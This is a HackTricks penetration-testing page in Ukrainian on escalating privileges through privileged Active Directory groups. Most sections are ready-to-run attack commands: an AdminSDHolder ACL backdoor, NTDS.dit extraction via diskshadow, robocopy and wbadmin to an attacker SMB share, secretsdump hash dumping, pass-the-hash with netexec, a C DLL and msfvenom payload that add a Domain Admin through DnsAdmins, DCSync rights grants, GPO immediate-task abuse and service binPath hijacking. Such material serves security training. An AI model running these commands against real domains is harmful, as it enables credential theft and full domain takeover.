# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дозволяє локальний вхід до контролера домену (DC).

Щоб визначити учасників цієї групи, виконується така команда:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавання нових користувачів дозволено, як і локальний вхід до DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

Список керування доступом (ACL) групи **AdminSDHolder** має вирішальне значення, оскільки він визначає дозволи для всіх "захищених груп" в Active Directory, зокрема для груп із високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може використати це, змінивши ACL групи **AdminSDHolder** і надавши стандартному користувачу повні дозволи. Фактично це дасть цьому користувачу повний контроль над усіма захищеними групами. Якщо дозволи цього користувача буде змінено або вилучено, їх буде автоматично відновлено протягом години через особливості роботи системи.<sup>[[14]](#references)</sup>

У новішій документації Windows Server кілька вбудованих груп операторів і надалі розглядаються як **захищені** об'єкти (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` тощо). Процес **SDProp** за замовчуванням запускається на **PDC Emulator** кожні 60 хвилин, встановлює `adminCount=1` і вимикає успадкування для захищених об'єктів. Це корисно як для persistence, так і для пошуку застарілих привілейованих користувачів, яких було вилучено із захищеної групи, але які все ще мають ACL без успадкування.<sup>[[12]](#references)</sup>

Команди для перевірки членів груп і зміни дозволів включають:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Доступний скрипт для пришвидшення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Докладнішу інформацію наведено на [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Членство в цій групі дає змогу читати видалені об'єкти Active Directory, що може розкрити конфіденційну інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Це корисно для **відновлення попередніх шляхів привілеїв**. Видалені об’єкти все ще можуть містити `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, старі SPN або DN видаленої привілейованої групи, яку згодом може відновити інший оператор.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Доступ до контролера домену

Доступ до файлів на DC обмежений, якщо користувач не входить до групи `Server Operators`, що змінює рівень доступу.

### Підвищення привілеїв

За допомогою `PsService` або `sc` із Sysinternals можна перевіряти та змінювати дозволи служб. Наприклад, група `Server Operators` має повний контроль над певними службами, що дає змогу виконувати довільні команди та підвищувати привілеї:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що `Server Operators` мають повний доступ, що дає змогу маніпулювати службами для отримання підвищених привілеїв.

## Backup Operators

Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` і `SeRestore`. Ці привілеї дають змогу переміщатися між папками, переглядати їхній вміст і копіювати файли навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати спеціальні скрипти.<sup>[[1]](#references)</sup>

Щоб переглянути учасників групи, виконайте:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Для використання цих привілеїв локально виконуються такі кроки:

1. Імпортуйте необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкніть і перевірте `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Отримувати доступ і копіювати файли з обмежених каталогів, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Прямий доступ до файлової системи Domain Controller дозволяє викрасти базу даних `NTDS.dit`, яка містить усі NTLM-хеші користувачів і комп’ютерів домену.

#### Using diskshadow.exe

1. Створіть тіньову копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` із shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` і `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Після вилучення: Pass-the-Hash до DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Використання wbadmin.exe

1. Налаштуйте файлову систему NTFS для SMB server на attacker machine і кешуйте облікові дані SMB на target machine.
2. Використайте `wbadmin.exe` для створення system backup та extraction `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Практичну демонстрацію дивіться у [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Учасники групи **DnsAdmins** можуть скористатися своїми привілеями для завантаження довільної DLL із привілеями SYSTEM на DNS server, який часто розміщений на Domain Controllers. Ця можливість забезпечує значний потенціал для exploitation.

Щоб переглянути учасників групи DnsAdmins, використайте:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Виконання довільної DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дає змогу виконувати довільний код із привілеями SYSTEM у службі DNS (зазвичай усередині DC). Цю проблему було виправлено у 2021 році.

Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (для чого можуть знадобитися додаткові дозволи) необхідний для завантаження DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для отримання додаткової інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll

Також можна використовувати mimilib.dll для виконання команд, модифікувавши його для виконання певних команд або reverse shells. [Перегляньте цей допис](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), щоб отримати додаткову інформацію.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins можуть маніпулювати DNS-записами для виконання атак Man-in-the-Middle (MitM), створивши WPAD-запис після вимкнення глобального списку блокування запитів. Для spoofing і перехоплення мережевого трафіку можна використовувати такі інструменти, як Responder або Inveigh.

### Event Log Readers
Учасники можуть отримувати доступ до журналів подій і потенційно знаходити конфіденційну інформацію, наприклад паролі у відкритому тексті або відомості про виконання команд:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ця група може змінювати DACLs об’єкта домену, потенційно надаючи привілеї DCSync. Техніки підвищення привілеїв із використанням цієї групи детально описані в GitHub-репозиторії Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Якщо ви можете діяти як учасник цієї групи, класичне зловживання полягає в наданні контрольованому атакувальником суб’єкту прав реплікації, необхідних для [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Історично **PrivExchange** поєднував доступ до поштових скриньок, примусову автентифікацію Exchange і LDAP relay, щоб отримати доступ до цього самого примітиву. Навіть якщо цей relay-шлях захищено, пряме членство в `Exchange Windows Permissions` або контроль над сервером Exchange залишається цінним шляхом до прав реплікації домену.

## Hyper-V Administrators

Hyper-V Administrators мають повний доступ до Hyper-V, що можна використати для отримання контролю над віртуалізованими Domain Controllers. Це включає клонування активних DC і вилучення NTLM-хешів із файлу NTDS.dit.

### Приклад експлуатації

На практиці зловживання зазвичай полягає в **офлайн-доступі до дисків/checkpoints DC**, а не у використанні старих host-level LPE-трюків. Маючи доступ до Hyper-V host, оператор може створити checkpoint або експортувати віртуалізований Domain Controller, підключити VHDX і вилучити `NTDS.dit`, `SYSTEM` та інші секрети, не взаємодіючи з LSASS усередині guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Звідти повторно використайте workflow `Backup Operators`, щоб скопіювати `Windows\NTDS\ntds.dit` і вулики реєстру в автономному режимі.

## Group Policy Creators Owners

Ця група дозволяє учасникам створювати Group Policies у домені. Однак її учасники не можуть застосовувати групові політики до користувачів або груп, а також редагувати наявні GPO.

Важливий нюанс полягає в тому, що **творець стає власником нового GPO** і зазвичай отримує достатні права для його подальшого редагування. Це означає, що ця група становить інтерес, коли ви можете:

- створити malicious GPO і переконати адміністратора прив’язати його до цільового OU/домену
- редагувати створений вами GPO, який уже прив’язаний у корисному місці
- зловжити іншим делегованим правом, що дозволяє прив’язувати GPO, тоді як ця група надає права на редагування

Практичне зловживання зазвичай передбачає додавання **Immediate Task**, **startup script**, членства в локальній групі адміністраторів або зміни **user rights assignment** через файли політик, що зберігаються в SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Якщо редагуєте GPO вручну через `SYSVOL`, пам’ятайте, що самої зміни недостатньо: також потрібно оновити `versionNumber`, `GPT.ini`, а іноді й `gPCMachineExtensionNames`, інакше клієнти проігнорують оновлення політики.<sup>[[9]](#references)</sup>

## Керування організацією

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Organization Management**, має значні можливості. Ця група має привілеї **отримувати доступ до поштових скриньок усіх користувачів домену** та забезпечує **повний контроль над** Organizational Unit (OU) **'Microsoft Exchange Security Groups'**. Цей контроль охоплює групу **`Exchange Windows Permissions`**, яку можна використати для підвищення привілеїв.

### Експлуатація привілеїв і команди

#### Print Operators

Члени групи **Print Operators** мають кілька привілеїв, зокрема **`SeLoadDriverPrivilege`**, що дає їм змогу **локально входити до контролера домену**, вимикати його та керувати принтерами. Для експлуатації цих привілеїв, особливо якщо **`SeLoadDriverPrivilege`** не відображається в неелевованому контексті, необхідно обійти User Account Control (UAC).<sup>[[1]](#references)</sup>

Щоб переглянути учасників цієї групи, використовується така команда PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
На контролерах домену ця група небезпечна, оскільки стандартна політика контролера домену надає **`SeLoadDriverPrivilege`** групі `Print Operators`. Якщо ви отримаєте elevated token для учасника цієї групи, можна активувати privilege та завантажити підписаний, але вразливий драйвер, щоб перейти до kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Докладніше про роботу з токенами див. у розділі [Токени доступу](../windows-local-privilege-escalation/access-tokens.md).

#### Користувачі віддаленого робочого стола

Учасникам цієї групи надається доступ до ПК через Remote Desktop Protocol (RDP). Для переліку цих учасників доступні команди PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості про експлуатацію RDP можна знайти у спеціалізованих ресурсах з pentesting.

#### Remote Management Users

Учасники можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перелік цих учасників можна отримати за допомогою:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов’язаних із **WinRM**, слід звернутися до відповідної документації.

#### Server Operators

Ця група має дозволи на виконання різних конфігурацій на контролерах домену, зокрема привілеї резервного копіювання та відновлення, зміну системного часу й вимкнення системи.<sup>[[1]](#references)</sup> Щоб перелічити її учасників, використовується наведена команда:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
На контролерах домену група `Server Operators` зазвичай успадковує достатні права для **переналаштування або запуску/зупинки служб**, а також отримує `SeBackupPrivilege`/`SeRestorePrivilege` через стандартну політику DC. На практиці це робить її містком між **зловживанням керуванням службами** та **вилученням NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Якщо ACL служби надає цій групі права на зміну/запуск, вкажіть для служби довільну команду, запустіть її від імені `LocalSystem`, а потім відновіть початковий `binPath`. Якщо керування службами заблоковано, скористайтеся наведеними вище методами `Backup Operators`, щоб скопіювати `NTDS.dit`.

## References

- [1] [ired.team – Привілейовані облікові записи та привілеї токенів](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Зловживання SeLoadDriverPrivilege для підвищення привілеїв](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Зловживання дозволами GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Зловживання GPO, частина 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Посібник red team для GPO та OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Функція ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Анонімний LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Додаток C: Захищені облікові записи та групи в Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Як зловживати AdminSDHolder і створити в ньому backdoor для отримання persistence Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Зловживання привілеєм DnsAdmins для підвищення прав в Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Інформація про зловживання зв’язком GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Функція NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
